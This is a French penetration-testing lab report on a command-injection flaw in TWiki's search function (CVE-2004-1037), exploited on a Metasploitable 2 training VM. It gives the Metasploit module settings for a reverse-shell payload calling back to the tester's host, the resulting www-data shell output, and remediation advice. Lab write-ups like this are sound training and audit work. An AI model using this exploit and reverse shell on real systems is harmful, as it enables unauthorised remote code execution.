TWiki — fonction de recherche

Expression de recherche évaluée sans filtrage → exécution de commande (RCE)

Service / PortTWiki (wiki Perl) — port 80, /twiki/
CibleMetasploitable 2 — 192.168.56.101
CVECVE-2004-1037
RésultatRCE www-data (shell de commande, sans authentification)
Testé parZANNOU Josaphat

1. Identification

TWiki est un wiki écrit en Perl, listé sur la page d'accueil du serveur. Sa fonction de recherche évalue l'expression fournie d'une manière insuffisamment filtrée : en y glissant des métacaractères (backticks), on fait exécuter une commande arbitraire côté serveur, sans authentification. Faille distincte des autres applis du port 80.

2. Méthode d'identification de la CVE et du module

Première question : cette fonction a-t-elle une faille connue ?

$ searchsploit twiki

TWiki 20030201 - 'search.pm' Remote Command Execution        | cgi/webapps/642.pl
TWiki - Search Function Arbitrary Command Execution (Metasp)  | php/webapps/16894.rb

Chemin du module dans msfconsole :

$ msfconsole -q -x "search twiki; exit"

#  Full Name                         Disclosure Date  Rank       Check  Name
4  exploit/unix/webapp/twiki_search  2004-10-01       excellent  Yes    TWiki Search Function Arbitrary Command Execution

Puis la CVE et le mécanisme :

$ msfconsole -q -x "info exploit/unix/webapp/twiki_search; exit"

References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-1037
  https://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch

La section References confirme CVE-2004-1037 : la fonction search passe l'expression de recherche à une évaluation Perl insuffisamment filtrée ; en y injectant des backticks, on fait exécuter une commande shell par le serveur web (www-data).

Une recherche forgée dans TWiki exécute une commande arbitraire côté serveur — sans authentification, avec les droits www-data.

3. Démarche d'exploitation

Démarche interactive dans msfconsole, commande par commande :

msf6 > use exploit/unix/webapp/twiki_search
msf6 exploit(unix/webapp/twiki_search) > set RHOSTS 192.168.56.101
msf6 exploit(unix/webapp/twiki_search) > set RPORT 80
msf6 exploit(unix/webapp/twiki_search) > set URI /twiki/bin
msf6 exploit(unix/webapp/twiki_search) > set payload cmd/unix/reverse
msf6 exploit(unix/webapp/twiki_search) > set LHOST 192.168.56.1
msf6 exploit(unix/webapp/twiki_search) > set LPORT 4448

Point d'attention — URI /twiki/bin est le chemin des scripts CGI de TWiki (valeur par défaut du module, correcte ici) ; LHOST/LPORT pour le reverse shell.

4. Preuve d'accès obtenu

La phase check confirme la cible vulnérable, puis l'envoi de la recherche forgée ouvre le shell :

msf6 exploit(unix/webapp/twiki_search) > run -z
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.56.1:4448 -> 192.168.56.101:49053)
msf6 exploit(unix/webapp/twiki_search) > sessions -c "id; uname -a; hostname; whoami" -i 1
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
www-data

Accès confirmé en www-data : la commande injectée via la recherche s'exécute avec les droits du serveur web. Même faille que le TWiki de MS1 (CVE-2004-1037), reconfirmée sur MS2.

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour TWiki vers une version corrigée (l'évaluation de la recherche a été sécurisée après cette CVE).
  • Ne jamais évaluer d'entrée utilisateur comme du code (Perl eval) ; filtrer strictement l'expression de recherche.
  • Restreindre l'exposition réseau de l'application et appliquer le moindre privilège au compte du serveur web.
